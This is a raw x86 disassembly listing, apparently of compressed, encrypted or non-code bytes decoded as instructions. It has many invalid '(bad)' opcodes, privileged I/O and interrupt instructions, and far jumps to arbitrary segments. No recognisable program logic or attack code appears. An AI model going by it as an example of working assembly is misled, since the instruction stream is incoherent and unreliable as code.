  404a49:	outs   dx,BYTE PTR ds:[esi]
  404a4a:	sub    al,0xe6
  404a4c:	loope  0x404a3b
  404a4e:	ds jp  0x404a21
  404a51:	popa   
  404a52:	lods   eax,DWORD PTR ds:[esi]
  404a53:	xor    DWORD PTR [eax+ebx*4-0x40],ebx
  404a57:	pop    eax
  404a58:	aas    
  404a59:	dec    esp
  404a5a:	xchg   edx,eax
  404a5b:	xchg   bx,ax
  404a5d:	out    dx,eax
  404a5e:	int3   
  404a5f:	jae    0x404aaa
  404a61:	xor    ch,0xf6
  404a64:	pop    es
  404a65:	in     al,dx
  404a66:	push   ebp
  404a67:	or     dl,BYTE PTR [eax+0x62]
  404a6a:	push   ebp
  404a6b:	mov    bl,0x7d
  404a6d:	test   eax,0x1de7e3ab
  404a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a73:	stc    
  404a74:	sbb    esi,DWORD PTR [edx-0x7daaaf57]
  404a7a:	jg     0x404a3f
  404a7c:	mov    ch,0xac
  404a7e:	mov    dl,0x26
  404a80:	outs   dx,BYTE PTR ds:[esi]
  404a81:	addr16 push ecx
  404a83:	or     DWORD PTR [eax+0xd],0x1687811a
  404a8a:	ficom  WORD PTR gs:[esi]
  404a8d:	inc    esi
  404a8e:	xchg   ebx,eax
  404a8f:	(bad)  
  404a90:	mov    eax,0x1f3db7d5
  404a95:	and    al,0xd6
  404a97:	retf   0xc2bb
  404a9a:	adc    al,0xc9
  404a9c:	sbb    eax,0xb75e88a5
  404aa1:	adc    bh,BYTE PTR [esp+ebx*8]
  404aa4:	xchg   ebx,eax
  404aa5:	ret    
  404aa6:	ret    
  404aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aa8:	sbb    cl,BYTE PTR [eax+esi*8+0x10]
  404aac:	ins    DWORD PTR es:[edi],dx
  404aad:	les    edx,FWORD PTR [ebx-0x1c]
  404ab0:	test   DWORD PTR [edx-0x43],esp
  404ab3:	or     al,BYTE PTR [ebx]
  404ab5:	stc    
  404ab6:	pushf  
  404ab7:	xchg   edx,eax
  404ab8:	sub    edi,DWORD PTR [esi]
  404aba:	push   ds
  404abb:	sar    DWORD PTR [ebx],1
  404abd:	or     DWORD PTR [esp+eiz*4],ecx
  404ac0:	dec    esp
  404ac1:	add    al,0xcd
  404ac3:	in     al,dx
  404ac4:	jns    0x404b3a
  404ac6:	sub    bl,BYTE PTR [edx-0x2e81dd47]
  404acc:	mov    BYTE PTR [ebx],al
  404ace:	inc    edx
  404acf:	sub    eax,0x14a87cb3
  404ad4:	push   0xffffffe2
  404ad6:	cdq    
  404ad7:	mov    esp,0xe28be0e8
  404adc:	outs   dx,DWORD PTR ds:[esi]
  404add:	outs   dx,BYTE PTR ds:[esi]
  404ade:	sub    eax,0x880709b9
  404ae3:	sub    BYTE PTR [edi+0x1f],dl
  404ae6:	cdq    
  404ae7:	mov    cl,0x18
  404ae9:	fldcw  WORD PTR [ebp-0x76]
  404aec:	inc    ebp
  404aed:	jb     0x404b5f
  404aef:	(bad)  [ebx+0x4d]
  404af2:	mov    ebp,0xe67cf67f
  404af7:	repz and eax,DWORD PTR [eax+0x289f29ea]
  404afe:	popa   
  404aff:	mov    ds:0x42bb3191,eax
  404b04:	scas   al,BYTE PTR es:[edi]
  404b05:	stos   BYTE PTR es:[edi],al
  404b06:	aad    0xeb
  404b08:	sti    
  404b09:	fmul   DWORD PTR [edx]
  404b0b:	dec    edi
  404b0c:	int    0xb6
  404b0e:	call   0x18d9:0x740f2972
  404b15:	ins    BYTE PTR es:[edi],dx
  404b16:	pop    ds
  404b17:	sub    bh,ch
  404b19:	das    
  404b1a:	or     cl,BYTE PTR [edi+0x67]
  404b1d:	out    dx,eax
  404b1e:	push   0x619b553b
  404b23:	pop    ss
  404b24:	pop    es
  404b25:	mov    al,ds:0x58727c2
  404b2a:	loope  0x404b72
  404b2c:	xor    al,0x53
  404b2e:	(bad)  
  404b2f:	pop    ds
  404b30:	out    dx,eax
  404b31:	lds    ecx,FWORD PTR [ebp+0x4999db1b]
  404b37:	mov    edi,0xbf267942
  404b3c:	mov    ebx,0x382580a2
  404b41:	and    esp,DWORD PTR [ebp+edi*2-0x234d436f]
  404b48:	loop   0x404b97
  404b4a:	in     al,dx
  404b4b:	jecxz  0x404bc8
  404b4d:	dec    edi
  404b4e:	push   ds
  404b4f:	and    al,0x9c
  404b51:	pop    ebp
  404b52:	mov    ds:0x57b06cf3,eax
  404b57:	jbe    0x404b76
  404b59:	or     eax,0xbc90fea9
  404b5e:	cmp    esp,ecx
  404b60:	jo     0x404b29
  404b62:	and    ebx,DWORD PTR [esi]
  404b64:	mov    dh,0x20
  404b66:	cld    
  404b67:	aas    
  404b68:	pop    ebx
  404b69:	push   ds
  404b6a:	sbb    DWORD PTR gs:[edx-0x1386df26],eax
  404b71:	mov    ecx,0x1314daa9
  404b76:	arpl   WORD PTR [eax+0x22],dx
  404b79:	push   esp
  404b7a:	jge    0x404bf9
  404b7c:	xor    DWORD PTR [ecx-0x1bca21cc],ebp
  404b82:	fiadd  WORD PTR [esi-0x4fc28d24]
  404b88:	mov    ecx,0xa4c4f93c
  404b8d:	pop    eax
  404b8e:	and    edx,DWORD PTR [ecx]
  404b90:	mov    esp,0x8a577186
  404b95:	sar    DWORD PTR [edi+0x2b],0xd9
  404b99:	sar    BYTE PTR [edi+0x596f9678],cl
  404b9f:	pop    esi
  404ba0:	xlat   BYTE PTR ds:[ebx]
  404ba1:	fimul  DWORD PTR [edi]
  404ba3:	and    eax,0x59a4dea7
  404ba8:	mov    esp,0x950a7ed5
  404bad:	or     BYTE PTR [ebp-0x292aa96e],bh
  404bb3:	cs cmp eax,0xe7c847c3
  404bb9:	push   0xf43a4aaf
  404bbe:	mov    cl,0x82
  404bc0:	add    bl,dh
  404bc2:	pop    ebx
  404bc3:	dec    esi
  404bc4:	popf   
  404bc5:	idiv   esp
  404bc7:	adc    ecx,DWORD PTR [edx]
  404bc9:	mov    edi,0xd4916fa8
  404bce:	loope  0x404b79
  404bd0:	(bad)  
  404bd2:	or     ebp,DWORD PTR [ebx+0x71]
  404bd5:	fs js  0x404bcd
  404bd8:	mov    ebp,0x3ec0cc90
  404bdd:	hlt    
  404bde:	or     edx,DWORD PTR [esi-0x796fdb1f]
  404be4:	xor    bh,al
  404be6:	inc    edx
  404be7:	mov    esi,0x9c05a3ea
  404bec:	cwde   
  404bed:	inc    ebp
  404bee:	and    bl,BYTE PTR [ebp-0x552e0292]
  404bf4:	lds    ebp,FWORD PTR [ebx]
  404bf6:	push   es
  404bf7:	xchg   DWORD PTR [ecx+0x4a],esi
  404bfa:	cli    
  404bfb:	sub    ecx,esi
  404bfd:	stos   DWORD PTR es:[edi],eax
  404bfe:	leave  
  404bff:	jbe    0x404c2e
  404c01:	rcr    DWORD PTR [edx+0x3d],0x63
  404c05:	test   eax,eax
  404c07:	push   esp
  404c08:	int    0x8c
  404c0a:	xor    al,0x81
  404c0c:	std    
  404c0d:	sub    bl,dl
  404c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c10:	hlt    
  404c11:	int    0xd7
  404c13:	push   0x5559671c
  404c18:	ds cmp eax,0x636c2a2d
  404c1e:	jbe    0x404bdf
  404c20:	test   BYTE PTR [eax+0x18],bh
  404c23:	and    al,0x8a
  404c25:	cmp    BYTE PTR [ebx+0x693620fe],dl
  404c2b:	jo     0x404bef
  404c2d:	push   eax
  404c2e:	lods   al,BYTE PTR ds:[esi]
  404c2f:	rol    ebx,0x24
  404c32:	sahf   
  404c33:	mul    BYTE PTR [esi+esi*8-0x67cac973]
  404c3a:	add    esi,DWORD PTR [ebx]
  404c3c:	cmp    edi,DWORD PTR [ecx-0x71]
  404c3f:	pop    ecx
  404c40:	test   al,0x20
  404c42:	(bad)  
  404c43:	loop   0x404c8b
  404c45:	test   al,0xe9
  404c47:	daa    
  404c48:	sbb    al,0xb8
  404c4a:	pusha  
  404c4b:	push   0x18
  404c4d:	fcmovnb st,st(5)
  404c4f:	rcr    ebp,cl
  404c51:	pop    ecx
  404c52:	mov    al,ds:0x9a19afd5
  404c57:	cld    
  404c58:	mov    bh,0x3b
  404c5a:	pusha  
  404c5b:	mov    DWORD PTR [ebx],edi
  404c5d:	call   FWORD PTR [edi+ecx*8]
  404c60:	test   bh,ch
  404c62:	and    BYTE PTR [eax-0x298cd4ba],bh
  404c68:	sbb    al,0xd4
  404c6a:	mov    BYTE PTR [eax-0xa],bl
  404c6d:	dec    ebp
  404c6e:	inc    esp
  404c6f:	jle    0x404cd4
  404c71:	fcmovu st,st(7)
  404c73:	leave  
  404c74:	cmp    edi,DWORD PTR [edi-0x2af8d8eb]
  404c7a:	mov    dl,0xa2
  404c7c:	sub    bl,BYTE PTR [ebp+edx*1-0x69c753ec]
  404c83:	test   al,0x7f
  404c85:	xchg   esp,eax
  404c86:	jbe    0x404cda
  404c88:	push   ds
  404c89:	icebp  
  404c8a:	stos   DWORD PTR es:[edi],eax
  404c8b:	xchg   ebp,eax
  404c8c:	xchg   ebp,eax
  404c8d:	dec    ecx
  404c8e:	jmp    0x404cbf
  404c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c92:	inc    esp
  404c93:	xor    cl,BYTE PTR [esp+eiz*4+0x30643852]
  404c9a:	dec    ebp
  404c9b:	xlat   BYTE PTR ds:[ebx]
  404c9c:	js     0x404c5e
  404c9e:	cmc    
  404c9f:	pop    edx
  404ca0:	xor    bl,dh
  404ca2:	aaa    
  404ca3:	loopne 0x404cd3
  404ca5:	nop
  404ca6:	add    esp,ebx
  404ca8:	rol    DWORD PTR [ecx-0x68c2e34a],0x85
  404caf:	xchg   esp,eax
  404cb0:	dec    ebp
  404cb1:	or     DWORD PTR [edi-0x14],esi
  404cb4:	pop    edx
  404cb5:	jne    0x404d1f
  404cb7:	cs sub al,0x6a
  404cba:	mov    eax,ds:0xe4da4ae9
  404cbf:	icebp  
  404cc0:	fdivr  DWORD PTR [ecx+0x44316989]
  404cc6:	sub    DWORD PTR [edx],ebx
  404cc8:	mov    dl,0x5e
  404cca:	and    DWORD PTR [edx-0x29ab261d],0x30
  404cd1:	sbb    ebx,DWORD PTR [ecx+0x4739ee1b]
  404cd7:	sub    bl,BYTE PTR [eax-0x1c]
  404cda:	imul   eax,DWORD PTR [ebx],0x1743eb05
  404ce0:	sti    
  404ce1:	push   0x6591db07
  404ce6:	aad    0x8d
  404ce8:	add    al,BYTE PTR [ebx+0x25e86189]
  404cee:	and    dh,BYTE PTR [edi+0x12]
  404cf1:	adc    al,0x87
  404cf3:	or     esp,DWORD PTR [edi-0x7fcccf6]
  404cf9:	aam    0xd8
  404cfb:	or     DWORD PTR [edx],ebp
  404cfd:	xor    dh,dh
  404cff:	test   DWORD PTR [ebx+0x44b8c2f9],edx
  404d05:	inc    eax
  404d06:	outs   dx,DWORD PTR ds:[esi]
  404d07:	mov    BYTE PTR [edi],cl
  404d09:	adc    eax,0x110e566b
  404d0e:	and    dl,BYTE PTR [esp+eax*1+0x1c]
  404d12:	jmp    0xf7537daa
  404d17:	aas    
  404d18:	fcomp  DWORD PTR [edx+0x60a939b]
  404d1e:	jne    0x404cd4
  404d20:	ins    DWORD PTR es:[edi],dx
  404d21:	fwait
  404d22:	lock shl BYTE PTR [edx-0x308e3d96],1
  404d29:	pop    esi
  404d2a:	sti    
  404d2b:	test   DWORD PTR [ecx+0x68],0x8ee6f265
  404d32:	pop    ecx
  404d33:	add    edx,ebx
  404d35:	rol    DWORD PTR [esi-0x5cda85e4],cl
  404d3b:	iret   
  404d3c:	cmp    al,cl
  404d3e:	das    
  404d3f:	mov    esi,DWORD PTR [esp+edx*8-0xb8760c]
  404d46:	inc    ebx
  404d47:	jae    0x404d2d
  404d49:	fld    st(5)
  404d4b:	div    BYTE PTR [edi+0x26]
  404d4e:	stc    
  404d4f:	popa   
  404d50:	out    dx,eax
  404d51:	add    eax,0x8db77d82
  404d56:	cmp    dl,BYTE PTR [edi-0x2b]
  404d59:	mov    ebp,DWORD PTR [edx-0x721187bd]
  404d5f:	jo     0x404dc4
  404d61:	inc    edx
  404d62:	ins    DWORD PTR es:[edi],dx
  404d63:	sub    esi,ebp
  404d65:	xor    BYTE PTR [ebx-0x1979cd41],al
  404d6b:	dec    ecx
  404d6c:	pop    ds
  404d6d:	ret    0x3670
  404d70:	cli    
  404d71:	mov    BYTE PTR [ebx+0x559ff1c0],0x83
  404d78:	dec    eax
  404d79:	(bad)  
  404d7a:	in     al,0x70
  404d7c:	jns    0x404dce
  404d7e:	inc    eax
  404d7f:	cmc    
  404d80:	dec    edx
  404d81:	push   ds
  404d82:	fisttp WORD PTR [eax+0x59]
  404d85:	div    esi
  404d87:	xor    ch,BYTE PTR [esi]
  404d89:	jbe    0x404df5
  404d8b:	stos   BYTE PTR es:[edi],al
  404d8c:	mov    cl,0xea
  404d8e:	sbb    al,0xd0
  404d90:	xor    edi,DWORD PTR [ebx+0x2]
  404d93:	stos   BYTE PTR es:[edi],al
  404d94:	test   ch,al
  404d96:	sub    eax,0xe091e527
  404d9b:	mov    al,ds:0x796c97fe
  404da0:	and    cl,ah
  404da2:	ret    
  404da3:	adc    edx,DWORD PTR ds:0xe654d869
  404da9:	dec    ebx
  404daa:	pop    ebp
  404dab:	push   ecx
  404dac:	jno    0x404d99
  404dae:	ins    DWORD PTR es:[edi],dx
  404daf:	les    eax,FWORD PTR fs:[edi-0x16125218]
  404db6:	lods   al,BYTE PTR ds:[esi]
  404db7:	adc    BYTE PTR [ebx-0x5e],bl
  404dba:	pop    edi
  404dbb:	dec    ecx
  404dbc:	jl     0x404d5c
  404dbe:	cdq    
  404dbf:	ficom  DWORD PTR [ebx]
  404dc1:	ds pop ebp
  404dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dc4:	xchg   esi,eax
  404dc5:	mov    eax,0x5fd6e8b0
  404dca:	push   esi
  404dcb:	cmp    DWORD PTR [edx-0x25a4b977],edx
  404dd1:	jnp    0x404e21
  404dd3:	call   0x9ac2528b
  404dd8:	test   DWORD PTR [eax],ebx
  404dda:	js     0x404dd8
  404ddc:	add    al,0xf2
  404dde:	sbb    dh,BYTE PTR [edi*1+0x220fdb7d]
  404de5:	fbld   TBYTE PTR [ebx+0x42f656cb]
  404deb:	add    BYTE PTR [edi+0x44dbdfc2],0x75
  404df2:	jnp    0x404e73
  404df4:	inc    ebx
  404df5:	ror    BYTE PTR [esi],cl
  404df7:	imul   edx,DWORD PTR [ecx+edx*4+0x75],0x74c3fea7
  404dff:	mov    ds:0x2cee68be,eax
  404e04:	add    al,0xf
  404e06:	retf   
  404e07:	jbe    0x404e0b
  404e09:	sub    al,0xff
  404e0b:	adc    BYTE PTR [ecx],dl
  404e0d:	ret    
  404e0e:	push   0xfffffff8
  404e10:	loopne 0x404d99
  404e12:	adc    DWORD PTR [ecx],ebx
  404e14:	out    dx,eax
  404e15:	lods   al,BYTE PTR ds:[esi]
  404e16:	ja     0x404e4f
  404e18:	inc    esi
  404e19:	je     0x404e85
  404e1b:	add    ebx,DWORD PTR [esp+ebp*2]
  404e1e:	sbb    BYTE PTR [edi+0x2f5990fd],bh
  404e24:	push   0x6d
  404e26:	pop    eax
  404e27:	loopne 0x404e4c
  404e29:	sbb    cl,BYTE PTR [esi+0x21]
  404e2c:	push   eax
  404e2d:	loop   0x404dda
  404e2f:	xchg   ebp,eax
  404e30:	outs   dx,DWORD PTR ds:[esi]
  404e32:	push   edi
  404e33:	mov    fs,WORD PTR [edi-0x5fc90945]
  404e39:	pop    ecx
  404e3a:	xchg   esp,eax
  404e3b:	push   ss
  404e3c:	int3   
  404e3d:	add    eax,0x245b3547
  404e42:	pop    eax
  404e43:	loop   0x404e56
  404e45:	inc    eax
  404e46:	push   0x83039709
  404e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e4c:	mov    ecx,0xf9bd21a4
  404e51:	adc    eax,0x70c309e9
  404e56:	jle    0x404deb
  404e58:	ss in  eax,0x7a
  404e5b:	mov    esp,0x334e0db4
  404e60:	enter  0xe657,0xc8
  404e64:	add    dl,BYTE PTR ds:0x30623cbb
  404e6a:	add    BYTE PTR [esi-0x197422ed],ah
  404e70:	ret    0x8b65
  404e73:	cmc    
  404e74:	(bad)  
  404e75:	mov    ah,0x4
  404e77:	dec    esp
  404e78:	aam    0xdd
  404e7a:	rcl    DWORD PTR [ecx],1
  404e7c:	jle    0x404ef7
  404e7e:	and    ch,BYTE PTR [edx+0x4a2b77ce]
  404e84:	ss (bad) 
  404e86:	mov    esi,ecx
  404e88:	(bad)  
  404e89:	jnp    0x404eac
  404e8b:	mov    esp,ebp
  404e8d:	push   cs
  404e8e:	idiv   DWORD PTR [ebx]
  404e90:	jp     0x404ead
  404e92:	sub    ch,BYTE PTR [eax+0x10]
  404e95:	inc    ecx
  404e96:	mov    ds:0x963bcd82,al
  404e9b:	jno    0x404ea1
  404e9d:	adc    DWORD PTR [eax-0xbdee6c2],ebp
  404ea3:	into   
  404ea4:	sbb    eax,0x532dce98
  404ea9:	inc    ecx
  404eaa:	loop   0x404e38
  404eac:	repz pop edi
  404eae:	cld    
  404eaf:	cmp    DWORD PTR [eax+edx*4-0x76],edx
  404eb3:	pop    ebx
  404eb4:	push   ecx
  404eb5:	cli    
  404eb6:	in     eax,dx
  404eb7:	and    ch,BYTE PTR [ebx+0x6cd970ab]
  404ebd:	mov    al,0x8a
  404ebf:	mov    ebx,0xc95ba6c5
  404ec4:	in     ax,0x24
  404ec7:	das    
  404ec8:	scas   al,BYTE PTR es:[edi]
  404ec9:	or     al,0xc0
  404ecb:	std    
  404ecc:	cli    
  404ecd:	iret   
  404ece:	fistp  DWORD PTR [ecx]
  404ed0:	add    esi,0xf833553f
  404ed6:	or     esp,DWORD PTR [edx-0x187ad628]
  404edc:	xchg   edi,eax
  404edd:	xor    al,0xaa
  404edf:	and    dl,dh
  404ee1:	lock add eax,0x83f18609
  404ee7:	fwait
  404ee8:	out    0x28,eax
  404eea:	addr16 jne 0x404f30
  404eed:	dec    BYTE PTR [esp+ebp*8-0x3f4d7727]
  404ef4:	bound  edx,QWORD PTR [ebx-0x79]
  404ef7:	xlat   BYTE PTR ds:[ebx]
  404ef8:	(bad)  
  404ef9:	jnp    0x404efd
  404efb:	xor    DWORD PTR [ebx-0x68db732d],ecx
  404f01:	jmp    0x8569:0x490f9a8
  404f08:	add    dh,al
  404f0a:	dec    DWORD PTR [esi+edx*4+0x5bbd4209]
  404f11:	cmp    al,0xab
  404f13:	add    BYTE PTR [edi],0x5c
  404f16:	aam    0x8f
  404f18:	lods   al,BYTE PTR ds:[esi]
  404f19:	push   edi
  404f1a:	into   
  404f1b:	test   BYTE PTR [edx-0x6a696203],al
  404f21:	inc    esi
  404f22:	add    cl,BYTE PTR [esi]
  404f24:	jge    0x404f57
  404f26:	cmp    al,0x8b
  404f28:	rol    BYTE PTR [ecx-0x333f4d12],cl
  404f2e:	jae    0x404f8f
  404f30:	cmp    al,dh
  404f32:	ins    BYTE PTR es:[edi],dx
  404f33:	jl     0x404f08
  404f35:	inc    ecx
  404f36:	imul   ecx,DWORD PTR [edi],0xcc9e2f62
  404f3c:	arpl   WORD PTR [ecx],bp
  404f3e:	mov    ah,0xe0
  404f40:	and    BYTE PTR [edi-0x7d],dh
  404f43:	sub    ch,BYTE PTR ds:[ecx+0x1129339a]
  404f4a:	mov    edi,0xdf6dc97f
  404f4f:	out    dx,eax
  404f50:	ret    
  404f51:	neg    bh
  404f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f54:	xor    DWORD PTR [ebp+0x6e],esi
  404f57:	aaa    
  404f58:	push   es
  404f59:	aas    
  404f5a:	dec    ebx
  404f5b:	ror    BYTE PTR [eax],1
  404f5d:	stos   BYTE PTR es:[edi],al
  404f5e:	outs   dx,DWORD PTR ds:[esi]
  404f5f:	fadd   DWORD PTR [ecx-0x3e747f7c]
  404f65:	or     eax,0x49735faa
  404f6a:	inc    edx
  404f6b:	push   edi
  404f6c:	lahf   
  404f6d:	dec    edi
  404f6e:	adc    edi,DWORD PTR [edx]
  404f70:	mov    DWORD PTR [edx-0x7818c070],0x52f2be27
  404f7a:	inc    esi
  404f7b:	jmp    0xe05cf624
  404f80:	in     al,dx
  404f81:	test   DWORD PTR [ebp+0x12e80674],ebx
  404f87:	mov    eax,ds:0xf67910c1
  404f8c:	pop    ebp
  404f8d:	cvtps2pi mm3,xmm3
  404f90:	push   ss
  404f91:	aam    0x66
  404f93:	bound  edx,QWORD PTR ds:0xfce75e67
  404f99:	adc    al,0xea
  404f9b:	cmc    
  404f9c:	mov    ebx,edx
  404f9e:	mov    dh,0xb1
  404fa0:	aas    
  404fa1:	outs   dx,BYTE PTR ds:[esi]
  404fa2:	adc    edx,DWORD PTR [edi]
  404fa4:	pop    ebx
  404fa5:	test   BYTE PTR [edx+0x7a964429],cl
  404fab:	dec    edi
  404fac:	adc    al,0x99
  404fae:	es add ebp,ecx
  404fb1:	pop    ss
  404fb2:	xor    BYTE PTR [ecx+0x7578d423],dl
  404fb8:	cmp    DWORD PTR [esi],ecx
  404fba:	enter  0x2d09,0xde
  404fbe:	and    DWORD PTR [ebx-0x3f3d7224],edi
  404fc4:	clc    
  404fc5:	pop    esp
  404fc6:	adc    BYTE PTR [edx+0x11],0x25
  404fca:	jbe    0x404f4d
  404fcc:	sti    
  404fcd:	push   DWORD PTR [ebp+0xedc5cf6]
  404fd3:	xchg   ecx,eax
  404fd4:	mov    edi,0x4709921b
  404fd9:	arpl   si,sp
  404fdb:	cmp    eax,0x9ba62bad
  404fe0:	aaa    
  404fe1:	or     ah,BYTE PTR [eax-0x4a0f0746]
  404fe7:	sbb    eax,0x7ea690e0
  404fec:	dec    ebx
  404fed:	xor    eax,0x9fee63b2
  404ff2:	jecxz  0x404fb3
  404ff4:	jecxz  0x404ffd
  404ff6:	cmp    BYTE PTR [ebx-0x7599d369],0x6d
  404ffd:	idiv   BYTE PTR [edi]
  404fff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405000:	aam    0xf6
  405002:	jp     0x404fd3
  405004:	sub    BYTE PTR [ecx+0x7],ah
  405007:	int    0xcc
  405009:	xor    BYTE PTR [ecx+0xa],bl
  40500c:	xchg   edi,eax
  40500d:	in     eax,0xb
  40500f:	mov    eax,ds:0x42fa4a81
  405014:	dec    ebp
  405015:	mov    ecx,0xce0d5f69
  40501a:	sub    bl,BYTE PTR ds:0x9923e6f6
  405020:	adc    ch,BYTE PTR [ebx-0x69d49186]
  405026:	mov    ebp,0x714fc67
  40502b:	pop    edi
  40502c:	std    
  40502d:	cdq    
  40502e:	rcr    edx,0xab
  405031:	mov    WORD PTR [edx+ebx*2-0x7d],gs
  405035:	sti    
  405036:	js     0x405078
  405038:	jbe    0x405032
  40503a:	push   eax
  40503b:	add    dl,BYTE PTR [edi+0xbb1c300]
  405041:	data16 jne 0x40501c
  405044:	pop    edi
  405045:	icebp  
  405046:	(bad)  
  405048:	fwait
  405049:	mov    esi,edi
  40504b:	retf   0x7e64
  40504e:	clc    
  40504f:	pop    ebp
  405050:	(bad)  [esi-0x7c]
  405053:	mov    bl,0xc3
  405055:	(bad)  
  405056:	xor    edx,DWORD PTR [ecx-0x29d7a4e3]
  40505c:	or     esi,eax
  40505e:	les    ebx,FWORD PTR [ebp-0x45]
  405061:	and    al,0x8
  405063:	je     0x40504d
  405065:	(bad)  [edx]
  405067:	jge    0x405003
  405069:	cmp    bh,BYTE PTR [edi+ebx*2]
  40506c:	stos   BYTE PTR es:[edi],al
  40506d:	xchg   ebp,eax
  40506e:	cmp    esp,DWORD PTR [ebx+0x44]
  405071:	pop    eax
  405072:	lods   al,BYTE PTR ds:[esi]
  405073:	daa    
  405074:	repnz mov esi,0xe133ca41
  40507a:	loope  0x405047
  40507c:	pop    ds
  40507d:	retf   
  40507e:	ror    BYTE PTR [ebp-0x73],1
  405081:	iret   
  405082:	mov    fs,WORD PTR [edx+0x3e]
  405085:	(bad)  
  405086:	(bad)  
  405088:	push   esp
  405089:	je     0x4050d1
  40508b:	(bad)  
  40508c:	pop    ss
  40508d:	or     eax,0x20f4eb8b
  405092:	mov    al,0xe6
  405094:	mov    ds:0x83510b77,al
  405099:	sbb    cl,BYTE PTR [eax-0x5cb8b8e9]
  40509f:	cmp    DWORD PTR [ecx+0xa],edi
  4050a2:	pop    ebx
  4050a3:	jle    0x40506a
  4050a5:	dec    edx
  4050a6:	jecxz  0x405106
  4050a8:	sbb    ch,bl
  4050aa:	cmp    eax,0x888df769
  4050af:	mov    dh,0xc7
  4050b1:	jne    0x4050fc
  4050b3:	gs pop ecx
  4050b5:	push   0x8
  4050b7:	call   0x142f:0x71eff0e1
  4050be:	inc    edi
  4050bf:	aad    0x5e
  4050c1:	std    
  4050c2:	pop    edi
  4050c3:	xor    DWORD PTR [ebp-0x70],esi
  4050c6:	ror    DWORD PTR [edx+0x3b],cl
  4050c9:	fisttp DWORD PTR [ebx+0x58]
  4050cc:	clc    
  4050cd:	sub    al,0x40
  4050cf:	dec    edx
  4050d0:	jne    0x40512d
  4050d2:	jmp    FWORD PTR [edx]
  4050d4:	loop   0x40511c
  4050d6:	dec    esi
  4050d7:	mov    ds:0x1480f499,al
  4050dc:	mov    ah,0x1
  4050de:	fsubr  DWORD PTR [ecx+0xd]
  4050e1:	cdq    
  4050e2:	add    eax,0xa85c7e63
  4050e7:	sub    BYTE PTR [eax],0xf2
  4050ea:	pop    ebp
  4050eb:	mov    esp,DWORD PTR [ecx+0x421655e8]
  4050f1:	imul   BYTE PTR [ebx+0x1b3d3662]
  4050f7:	mov    ch,0xe7
  4050f9:	loop   0x4050a5
  4050fb:	jae    0x40509a
  4050fd:	js     0x405106
  4050ff:	call   0x2285:0xea5d3531
  405106:	icebp  
  405107:	fsubrp st(4),st
  405109:	adc    esp,eax
  40510b:	pop    esi
  40510c:	adc    bl,bl
  40510e:	in     al,dx
  40510f:	imul   edx,DWORD PTR [edi-0x3a],0x5e
  405113:	sbb    al,0xc9
  405115:	mov    ah,0x50
  405117:	fidivr DWORD PTR [edi+esi*8]
  40511a:	mov    edi,0x46aa128c
  40511f:	xchg   edi,eax
  405120:	pop    es
  405121:	mov    dl,BYTE PTR [edi]
  405123:	add    eax,edx
  405125:	fcom   DWORD PTR [ecx]
  405127:	je     0x4050ca
  405129:	dec    edi
  40512a:	sbb    esi,DWORD PTR [ebp+0x2508c23c]
  405130:	adc    DWORD PTR [ebx],esi
  405132:	cdq    
  405133:	xchg   esp,eax
  405134:	add    BYTE PTR [edx-0xf],dl
  405137:	dec    eax
  405138:	push   0x47205c25
  40513d:	cmp    al,0x2e
  40513f:	fucomip st,st(3)
  405141:	jb     0x4050cb
  405143:	sub    eax,0x32f78a3f
  405148:	repz rol BYTE PTR [ebx-0x3b3f4cd],1
  40514f:	cmp    al,BYTE PTR [esi]
  405151:	mov    ebp,0xe56fe4b1
  405156:	sub    BYTE PTR [ecx],dl
  405158:	xchg   esi,eax
  405159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40515a:	or     bh,bl
  40515c:	adc    cl,BYTE PTR ds:0x5acd5ea2
  405162:	repnz fldpi 
  405165:	ret    
  405166:	dec    eax
  405167:	loop   0x405130
  405169:	inc    esp
  40516a:	jae    0x4050f1
  40516c:	fnsave [edx]
  40516e:	push   edi
  40516f:	cdq    
  405170:	(bad)
  405174:	outs   dx,DWORD PTR ds:[esi]
  405175:	dec    edx
  405176:	test   BYTE PTR [ebx+0x2af2ccd6],cl
  40517c:	jp     0x405132
  40517e:	xchg   edi,eax
  40517f:	xor    ch,cl
  405181:	mov    al,ds:0x6c496846
  405186:	pop    ecx
  405187:	sub    eax,0xebb951fd
  40518c:	inc    DWORD PTR [edi+0x423868f4]
  405192:	clc    
  405193:	sbb    BYTE PTR [edi+edx*1+0x6fb4f023],dl
  40519a:	popf   
  40519b:	pop    ss
  40519c:	aaa    
  40519d:	cmp    BYTE PTR [edi-0x488f183e],ch
  4051a3:	and    dl,BYTE PTR [esi-0x35]
  4051a6:	pop    es
  4051a7:	test   al,al
  4051a9:	push   0xda4fc9ca
  4051ae:	dec    eax
  4051af:	mov    ebp,0x71fe9382
  4051b4:	or     al,0xcd
  4051b6:	lods   al,BYTE PTR ds:[esi]
  4051b7:	sbb    DWORD PTR [ecx-0x863239b],esi
  4051bd:	js     0x405171
  4051bf:	stos   DWORD PTR es:[edi],eax
  4051c0:	pop    di
  4051c2:	sub    eax,DWORD PTR [edi+0xde25310]
  4051c8:	in     eax,0xf9
  4051ca:	enter  0xe600,0x7
  4051ce:	pop    esp
  4051cf:	and    eax,0x23c7f9ac
  4051d4:	retf   
  4051d5:	or     eax,0x151be639
  4051da:	sbb    al,0x7a
  4051dc:	add    bl,BYTE PTR [esi]
  4051de:	aaa    
  4051df:	lahf   
  4051e0:	xlat   BYTE PTR ds:[ebx]
  4051e1:	(bad)  
  4051e3:	and    BYTE PTR [edi-0x4f],bl
  4051e6:	hlt    
  4051e7:	mov    al,0x7b
  4051e9:	add    DWORD PTR [edx+0x481e5ca5],edi
  4051ef:	adc    dl,ah
  4051f1:	pop    es
  4051f2:	jp     0x405206
  4051f4:	pop    esi
  4051f5:	inc    esi
  4051f6:	xchg   edx,eax
  4051f7:	add    eax,0x5dab3a89
  4051fc:	push   ss
  4051fd:	in     eax,0xc5
  4051ff:	shr    DWORD PTR [esi-0xc],0xa2
  405203:	mov    dl,0xb8
  405205:	mov    ebx,0x8e08beda
  40520a:	stos   DWORD PTR es:[edi],eax
